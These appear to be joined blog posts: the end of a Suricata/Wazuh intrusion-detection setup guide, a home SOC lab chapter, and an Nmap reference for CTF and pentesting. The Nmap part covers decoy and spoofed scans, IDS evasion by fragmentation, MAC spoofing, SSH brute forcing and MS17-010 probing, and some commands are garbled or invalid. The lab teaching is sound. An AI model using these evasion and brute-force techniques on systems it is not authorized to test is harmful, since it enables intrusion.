Interface to sniff (af-packet, pcap, or nfqueue) Make sure Suricata knows which NIC to monitor. For example, if your internal network uses eth0 or ens3: af-packet: interface: eth0 or ens3 or whatever interface connects to internal network cluster-id: 99 cluster-type: cluster flow defrag: yes You can find your interface name via "ip a" command. 4. Using Emerging Threats Rules (Recommended) Install and update ET rules: sudo apt install suricata-update sudo suricata-update This will download: /var/lib/suricata/rules/suricata.rules . Test suricata sudo suricata -T -c /etc/suricata/suricata.yaml -v Once you've changed the config: sudo systemctl restart suricata Enable Wazuh integration Wazuh comes with a Suricata decoder and rules. Edit Wazuh config: sudo nano /var/ossec/etc/ossec.conf Add inside section ( tags): json /var/log/suricata/eve.json Restart Wazuh manager sudo systemctl restart wazuh-manager Suricata rules A Suricata rule has the format: action protocol src ip src port direction dst ip dst port (options) Example: alert tcp any any - any 3389 (msg:"RDP Connection Attempt"; sid:1000001; rev:1;) This means: alert: Generate an alert tcp: Protocol any any: Source IP and Port - : Direction any 3389: Destination IP and port (RDP) Inside () are rule options like: msg: Message shown sid: Unique rule ID rev: Revision After alerts are generated: Wazuh reads /var/log/suricata/eve.json Alerts will appear in the Wazuh dashboard Filter by: rule.name: "RDP Connection Attempt Detected" or data.alert.signature id: 1000001 Summary 1. Wazuh Central SIEM-like platform for logs & alerting -Installed on Ubuntu Collects logs from: -Windows Agent Suricata IDS (eve.json) Sysmon (via Windows agent) 2. Sysmon (on Windows) Logs detailed system events: Process creation File drops Registry changes Network connections Events collected by Wazuh Agent → sent to Wazuh Server 3. Suricata (on Ubuntu) Network-based Intrusion Detection System (NIDS) Monitors network traffic to/from Windows Detects: Nmap scans Exploits Malware traffic (C2, etc.) Writes to eve.json → Wazuh parses alerts What we can monitor Threat Category Detection Source Example ------------------- -------------------------- --------------------------------- Brute-force Sysmon + Wazuh rules 4625 login failures Malware dropper Sysmon (proc/file create) powershell.exe downloading files Reconnaissance Suricata Nmap, port scans Lateral movement Suricata + Sysmon SMB, PsExec, RDP Data exfiltration Suricata Large DNS, HTTP uploads Persistence Sysmon Registry Run keys, scheduled tasks Tampering Sysmon + Wazuh Security log cleared (1102)

title: SOC Lab — Ch.1: Setup & SIEM Deployment
excerpt: Building a home SOC lab with Wazuh SIEM, a Windows 10 endpoint, and Kali Linux as attacker. Covers internal networking, static IPs, and agent registration.
text: 🗂️ Project Overview Component Goal ------------------- ---------- Endpoint VMs Generate and send logs SIEM Server Collect, analyze, and alert on logs IDS/IPS Monitor network traffics Visualization Use dashboards to analyze activity Attacker Box Launch simulated attacks for testing Phase 1: Lab Setup Step 1 1) Install Virtualization Software Download VirtualBox or VMware Workstation 2) Enable Intel VT-x / AMD-V in BIOS for virtualization Step 2: Download OS ISOs Ubuntu Server 22.04 (SIEM server) https://ubuntu.com/download/server architectures It's recommended to have around 45G space, to run server and Wazuh (with logs). Installing Wazuh on the server First, we need to update sudo apt update sudo apt full-upgrade -y curl -sO https://packages.wazuh.com/4.12/wazuh-install.sh && sudo bash ./wazuh-install.sh -a After succssefull installation, we will get our creds to dashboard login. Kali linux Kali Linux (offensive machine) https://www.kali.org/get-kali/ kali-platforms sudo apt update Fetches the list of available updates sudo apt full-upgrade Installs updates; may also remove some packages, Windows 10 (endpt) Windows 10 (target endpoint) Installing Wazuh Agent on Windows https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-windows.html Step 3: Internal Network Setup Set all VMs to "Host-only" or "Internal Network" Assign static IPs or use DHCP with fixed leases Create an "Internal Network" I'll do it using virt-manager GUI, because i have QEMU/KVM VirtManager. 1) Open virt-manager 2) Go to Edit → Connection Details → Virtual Networks 3) Click + (Add network) Set: Name: internal-net Mode: Isolated network (no NAT or DHCP unless you want to add DHCP manually) Leave DHCP unchecked (for static IP) Finish & apply Next, attach VM to the Internal Network: Using virt-manager: 1) Open your VM → Details 2) Go to NIC (Network Interface) Select: Network source: internal-net Device model: virtio (recommended) (don't work for WIN10, choose another one) Assign Static IP in Ubuntu Server (Guest VM) Edit the Netplan config: sudo nano /etc/netplan/50-cloud-init.yaml network: version: 2 ethernets: enp1s0: dhcp4: no addresses: 192.168.100.10/24 gateway4: 192.168.100.1 nameservers: addresses: [8.8.8.8, 1.1.1.1] Apply: sudo netplan apply Test: ip a ping 192.168.100.1 Assign to Win10 Open Network Settings Press Windows Key + R, type ncpa.cpl, hit Enter. Right-click your network adapter (usually called Ethernet, or Ethernet 2). Click Properties. Next, set Static IP Scroll and select Internet Protocol Version 4 (TCP/IPv4). Click Properties. Select: Use the following IP address: Fill in the fields: Field Value IP address 192.168.100.20 Subnet mask 255.255.255.0 Default gateway 192.168.100.1 Preferred DNS 8.8.8.8 Alternate DNS 1.1.1.1 Click OK, then Close. Confirm Static IP Is Active Open Command Prompt: ipconfig You should see: IPv4 Address. . . . . . . . . . . : 192.168.100.20 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 192.168.100.1 Test connectivity: ping 192.168.100.10 (Wazuh server) Wazuh agent We need to register this agent to Wazuh server (soc server) Open Terminal on your Wazuh server (SOC-Server): sudo /var/ossec/bin/manage agents You’ll see a menu like: Wazuh v4.X Agent Manager Choose your action: (A)dd an agent (A). (E)xtract key for an agent (E). (L)ist already added agents (L). (R)emove an agent (R). (Q)uit. ➕ Add Agent Press A and hit Enter Fill in: Agent name → Win10-Endpt Agent IP → 192.168.100.20 (or leave blank if not used) Press Enter to finish Kali set up Add new connection Check with ping command. Okay, all set. Wazuh dashboard On your's host machine open https://192.168.100.10/ And we should see one active agent connected - win10 endpoint Now, we'll try to perform nmap scan on Win10. Lab graph: +-----------------------------+ Internal Network (SOC-Net) +-------------+---------------+ +---------------------------+---------------------------+ +--------------------+ +----------------------+ +-----------------------+ SOC-Server Win10-Endpoint Kali-Lab Ubuntu 22.04 Windows 10 Kali Linux IP: 192.168.100.10 IP: 192.168.100.20 IP: 192.168.100.30 Wazuh SIEM OSSEC Agent Adversary Simulator +--------+-----------+ +----------+-----------+ +-----------+-----------+ +-------------+------------+-------------+---------------+ Log Data & Events Sent To SOC-Server +-------------------------------------------------------------+ Web Dashboard on SOC-Server URL: http://192.168.100.10:5601 Credentials: admin / (default) +-------------------------------------------------------------+ Next, we’ll simulate attacks using Kali to test detection capabilities.

title: Nmap: Tips & Techniques for CTF
excerpt: Practical Nmap command reference for CTF and pentesting. SYN scanning, firewall evasion, NSE scripting, output formats, and scan delta comparison.
text: SYN Scan with Performance and Detection Control nmap -sS -Pn -n -T4 --max-retries 2 --host-timeout 60s 10.0.0.0/24 Explanation : -sS : TCP SYN scan (stealth scan, sends SYN, expects SYN/ACK or RST). -Pn : Skip host discovery (assume hosts are up, useful against firewalled hosts). -n : Disable DNS resolution (faster, avoids DNS noise). -T4 : Aggressive timing (shorter delays, faster scan). --max-retries 2 : Retries each probe max 2 times. --host-timeout 60s : Drop hosts taking too long (avoid bottlenecks). Packets : Sends SYN packets to each target port. No full handshake. No reverse DNS or ICMP used. Firewall Evasion and Spoofing nmap -sS -T1 -D 192.168.1.1,10.10.10.10,RND,RND --data-length 31 --source-port 53 10.0.0.1 Explanation : -T1 : Slow scan for stealth. -D : Use decoys to obfuscate source IP. --data-length 31 : Adds padding to packets (random length). --source-port 53 : Set source port to 53 (DNS) to exploit weak firewall rules. Packets : TCP SYN packets with decoy source IPs. Each packet is 31 bytes longer, sent slowly with fake origins. Full Port Discovery + Enumeration nmap -p- -T4 -sS -oA tcp fullscan nmap -sV -sC -p$(grep -oP ' d+/open' tcp fullscan.gnmap cut -d/ -f1 paste -sd, -) Explanation : -p- : Scan all 65535 ports. -oA : Output in all formats (XML, grepable, text). -sV : Version detection (active banner grabs). -sC : Default NSE scripts. Packets : SYN for discovery, followed by TCP connect or protocol-specific probes for versioning. NSE Examples: Service Analysis nmap -p80,443 --script http-headers,http-title,http-server-header nmap -p445 --script smb-vuln-ms17-010 Explanation : Uses Lua scripts to interact with protocols. Custom headers, titles, and SMB probes. Packets : HTTP requests for metadata. SMB probes for EternalBlue/MS17-010 detection. Credential Brute Forcing nmap -p22 --script ssh-brute --script-args userdb=users.txt,passdb=passes.txt Explanation : Attempts SSH login with user/pass combinations. Packets : SSH handshake + login attempts for each combo. Host Discovery with Minimal Fingerprint nmap -sn -PE -PS21,22,80,443 -PA3389 -n --disable-arp-ping 10.0.0.0/24 Explanation : -sn : Ping-only scan (no port scan). -PE : ICMP Echo Request. -PS : TCP SYN to specific ports. -PA : TCP ACK to detect stateless filtering. --disable-arp-ping : Donât send L2 pings. Packets : ICMP Echo, TCP SYN/ACK to simulate normal client traffic. Stack Fingerprint Obfuscation nmap -sS --data-length 25 --ip-options "R" Explanation : Adds raw IP options ( R ) and alters payload length. Packets : TCP SYN with IP header options and non-standard lengths to alter OS fingerprint profile. Scan Delta Comparison nmap -sS -oX scan1.xml nmap -sS -oX scan2.xml ndiff scan1.xml scan2.xml Explanation : Compare two scan outputs to find open/closed/different services. UDP Scan + Enumeration nmap -sU -T3 -F --top-ports 100 nmap -sU -p123 --script=ntp-info Explanation : -sU : UDP scan (no handshake; relies on ICMP unreachable or response). -F : Fast mode (top 100 ports). --script=ntp-info : Extracts NTP config and system info. Packets : Raw UDP packets sent to ports; analysis based on responses or ICMP errors. Output and Parsing nmap -oA project --stats-every 30s -vv -p- -sS xsltproc project.xml -o report.html Explanation : Real-time stats and detailed logging. Converts XML to HTML report. MAC Address Spoofing nmap -sS --spoof-mac 00:11:22:33:44:55 nmap -sS --spoof-mac Apple Explanation : Spoofs Ethernet frame source MAC to bypass local profiling or controls. TCP Fragmentation and IDS Evasion nmap -sS -f --mtu 24 --ttl 1337 Explanation : -f : Fragment packets to bypass simple IDS. --mtu : Force specific fragment size. --ttl : Obfuscate host distance estimation.
